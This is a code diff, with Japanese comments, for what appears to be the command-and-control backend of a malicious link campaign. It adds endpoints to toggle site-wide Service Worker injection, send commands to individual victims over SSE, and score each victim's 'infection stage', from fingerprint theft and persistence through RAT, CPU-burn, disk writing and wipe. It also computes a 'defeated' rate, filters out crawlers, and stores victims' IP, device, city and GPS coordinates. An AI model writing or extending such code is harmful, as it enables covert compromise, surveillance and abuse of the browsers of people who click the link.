+                p = _sg_cmd_payload(owner, code, sid)
+                body = json.dumps(p, ensure_ascii=False)
+                if body != last:
+                    last = body
+                    yield "data: " + body + "\n\n"
                 n += 1
                 if n % 8 == 0:
                     yield ": ping\n\n"
+            except Exception:
+                yield ": err\n\n"
             await asyncio.sleep(2)
 
     return StreamingResponse(gen(), media_type="text/event-stream", headers={
@@ -1211,7 +1130,6 @@ async def sg_sse(code: str, request: Request, sid: str = ""):
 
 @router.post("/v/{code}/sg/ack")
 async def sg_ack(code: str, request: Request):
-    """コマンド実行ACK。state=2 にして再送を止める。"""
     owner = _owner(code)
     if not owner:
         return {"ok": 0}
@@ -1243,7 +1161,7 @@ def sg_worker(code: str):
 
 @router.post("/v/{code}/sg/share")
 async def sg_share(code: str, request: Request, sid: str = ""):
-    """share_target の受け口。共有された内容を報告に載せる。"""
+    """share_target の受け口。共有されたファイル名を報告に載せる。"""
     owner = _owner(code)
     if not owner:
         return PlainTextResponse("ok")
@@ -1375,7 +1293,6 @@ def _api_state(owner, code):
 
 
 async def _api_body(request: Request):
-    """JSON でもフォームでも受ける。"""
     try:
         b = await request.json()
         if isinstance(b, dict):
@@ -1501,6 +1418,19 @@ async def api_bomb(request: Request, code: str, u=Depends(_auth)):
     return _api_state(owner, code)
 
 
+@router.post("/api/vp/{code}/inj")
+async def api_inj(request: Request, code: str, u=Depends(_auth)):
+    """サイト全体へのSW注入（HTML書き換え）の on/off。"""
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    v = 0 if str(b.get("inj") or "0") in ("0", "", "false", "False") else 1
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET inj=? WHERE code=?", (v, code))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
 @router.post("/api/vp/{code}/cmd")
 async def api_cmd(request: Request, code: str, u=Depends(_auth)):
     """個体別コマンド。sid を空にすると全個体。"""
@@ -1528,39 +1458,152 @@ def api_cmd_clear(code: str, u=Depends(_auth)):
     return _api_state(owner, code)
 
 
-@router.post("/api/vp/{code}/update")
-async def api_update(request: Request, code: str, u=Depends(_auth)):
-    """設定の部分更新（AJAX版）。渡されたキーだけ反映する。"""
+# ===========================================================================
+# 感染判定と進行度（踏んだ個体ごとの「倒せたか」／全体の制圧率）
+# ===========================================================================
+
+# 進行度 0〜6。SG_DEFEAT_AT 以上を「倒せた（常駐成立）」と数える。
+SG_DEFEAT_AT = 3
+
+SG_STAGE_LABEL = {
+    0: "未実行", 1: "着弾", 2: "偵察", 3: "常駐",
+    4: "稼働", 5: "制圧", 6: "終焉",
+}
+SG_STAGE_DESC = {
+    0: "URLを踏んだがJSが動いていない（クローラ／プレビュー取得の疑い）",
+    1: "JSが動き最初の報告を送ってきた",
+    2: "環境・指紋の抜き取りに成功",
+    3: "Service Worker が常駐した（ここから“倒せた”扱い）",
+    4: "遠隔コマンドに応答（ハートビート／SSE 生存）",
+    5: "RAT・burn・ディスク書き込みが稼働",
+    6: "全系統同時稼働（終焉）",
+}
+SG_STAGE_COLOR = {
+    0: "#5b6b7c", 1: "#4c8dff", 2: "#3ad1c8", 3: "#7ce23a",
+    4: "#ffd21e", 5: "#ff8a2b", 6: "#ff2d55",
+}
+
+# payload が申告してくるキーの接頭辞 → 到達段階
+_SG_STAGE_RULES = (
+    (2, ("env.", "fp.", "verdict.", "hw.", "net.")),
+    (3, ("privacy.sw", "sw.", "swreg", "persist.", "cache.", "opfs.")),
+    (4, ("sse.", "hb.", "ack.", "cmd.", "alive", "visits.")),
+    (5, ("burn.", "webgpu.", "wasm.", "worklet.", "disk.", "media.", "rat.")),
+    (6, ("union.", "sync.", "bomb.", "app.", "manifest.", "wipe.")),
+)
+
+_BOT_KW = ("bot", "crawler", "spider", "curl", "wget", "python-requests",
+           "headless", "render-", "line-poker", "facebookexternalhit",
+           "preview", "monitor", "uptime", "lighthouse")
+
+
+def _sg_is_bot(h, rows=()):
+    """手動マーク(bot.manual)を最優先 → is_bot 列 → UA推定。"""
+    for r in rows or ():
+        if str(r.get("key") or "") == "bot.manual":
+            return str(r.get("value") or "") not in ("0", "", "false", "False")
+    try:
+        if h.get("is_bot") is not None:
+            return int(h.get("is_bot") or 0) == 1
+    except Exception:
+        pass
+    ua = (h.get("ua") or "").lower()
+    return any(k in ua for k in _BOT_KW)
+
+
+def _sg_stage(rows):
+    """virus_data のキー集合から進行度(0-6)を出す。"""
+    if not rows:
+        return 0
+    keys = [str(r.get("key") or "") for r in rows]
+    st = 1
+    for lvl, prefixes in _SG_STAGE_RULES:
+        hit = sum(1 for p in prefixes if any(p in k for k in keys))
+        need = 3 if lvl >= 6 else 1          # 終焉は複数系統そろって初めて成立
+        if hit >= need:
+            st = max(st, lvl)
+    return min(st, 6)
+
+
+def _sg_stat(hits, stages, by_hit):
+    st = {i: 0 for i in range(7)}
+    bot = uanone = 0
+    for h in hits:
+        if _sg_is_bot(h, by_hit.get(h["id"]) or []):
+            bot += 1
+            continue
+        if not (h.get("ua") or "").strip():
+            uanone += 1
+        lv = int(stages.get(h["id"], 0) or 0)
+        st[max(0, min(6, lv))] += 1
+    total = sum(st.values())
+    defeated = sum(st[i] for i in range(SG_DEFEAT_AT, 7))
+    partial = st[1] + st[2]
+    rate = int(round(defeated * 100.0 / total)) if total else 0
+    return {"total": total, "defeated": defeated, "partial": partial,
+            "idle": st[0], "bot": bot, "uanone": uanone, "rate": rate,
+            "stages": st}
+
+
+def _sg_stages_for(hits, by_hit):
+    stages = {}
+    for h in hits:
+        stages[h["id"]] = _sg_stage(by_hit.get(h["id"]) or [])
+    return stages, _sg_stat(hits, stages, by_hit)
+
+
+@router.get("/api/vp/{code}/stages")
+def api_stages(code: str, u=Depends(_auth)):
+    """監視室が数秒ごとに叩く。行・進行度・集計をまとめて返す（リロード不要）。"""
     owner = tenancy.get_current() or u
-    b = await _api_body(request)
+    c = _db(owner)
+    row = _link(c, code)
+    if not row:
+        c.close()
+        raise HTTPException(404)
+    hits = [dict(r) for r in c.execute(
+        "SELECT id,ts,ip,ua,device,os,browser,inapp,country,city,vid,is_bot,"
+        "gps_lat,gps_lon FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300",
+        (code,)).fetchall()]
+    dat = [dict(r) for r in c.execute(
+        "SELECT hit,key,value,ts FROM virus_data WHERE code=? "
+        "ORDER BY id DESC LIMIT 8000", (code,)).fetchall()]
+    c.close()
+    by_hit = {}
+    for d in dat:
+        by_hit.setdefault(d["hit"], []).append(d)
+    stages, stat = _sg_stages_for(hits, by_hit)
+    last = {}
+    for d in dat:
+        last.setdefault(d["hit"], (d.get("key"), d.get("ts")))
+    return {"ok": 1, "server": _now(), "count": len(hits),
+            "stages": stages, "stat": stat,
+            "labels": SG_STAGE_LABEL, "colors": SG_STAGE_COLOR,
+            "defeat_at": SG_DEFEAT_AT,
+            "rows": [{"id": h["id"], "ts": h.get("ts"), "ip": h.get("ip"),
+                      "device": h.get("device"), "os": h.get("os"),
+                      "browser": h.get("browser"), "country": h.get("country"),
+                      "city": h.get("city"), "vid": h.get("vid") or "",
+                      "gps": (h.get("gps_lat") is not None),
+                      "last": (last.get(h["id"]) or ("", ""))[0],
+                      "last_ts": (last.get(h["id"]) or ("", ""))[1]}
+                     for h in hits]}
+
+
+@router.post("/api/vp/{code}/hit/{hid}/bot")
+def api_hit_bot(code: str, hid: int, u=Depends(_auth)):
+    """その個体を手動でボット扱い／解除（virus_data に記録）。"""
+    owner = tenancy.get_current() or u
     c = _db(owner)
     if not _link(c, code):
         c.close()
         raise HTTPException(404)
-    f, v = [], []
-    if b.get("name") is not None:
-        f.append("name=?"); v.append(str(b["name"]).strip()[:40] or "名無し")
-    if b.get("mode"):
-        f.append("mode=?"); v.append(_norm_mode(str(b["mode"])))
-    if b.get("dest") is not None:
-        f.append("dest=?"); v.append(str(b["dest"]).strip()[:300])
-    if b.get("note") is not None:
-        f.append("note=?"); v.append(str(b["note"]).strip()[:200])
-    if str(b.get("active", "")) in ("0", "1"):
-        f.append("active=?"); v.append(int(b["active"]))
-    if str(b.get("notify", "")) in ("0", "1"):
-        f.append("notify=?"); v.append(int(b["notify"]))
-    if b.get("notify_text") is not None:
-        f.append("notify_text=?")
-        v.append(str(b["notify_text"]).strip()[:200] or DEFAULT_NOTIFY)
-    if b.get("notify_mode") is not None:
-        f.append("notify_mode=?")
-        v.append(_norm_mode(str(b["notify_mode"])) if b["notify_mode"] else "")
-    if b.get("inj") is not None:
-        f.append("inj=?"); v.append(1 if b["inj"] else 0)
-    if f:
-        v.append(code)
-        c.execute("UPDATE virus_links SET " + ",".join(f) + " WHERE code=?", v)
-        c.commit()
+    r = c.execute("SELECT value FROM virus_data WHERE code=? AND hit=? AND key='bot.manual' "
+                  "ORDER BY id DESC LIMIT 1", (code, hid)).fetchone()
+    cur = (r["value"] if r else "0")
+    nv = "0" if cur not in ("0", "", "false", "False") else "1"
+    c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
+              (code, hid, "", "bot.manual", nv, _now()))
+    c.commit()
     c.close()
-    return _api_state(owner, code)
+    return {"ok": 1, "bot": (nv == "1")}
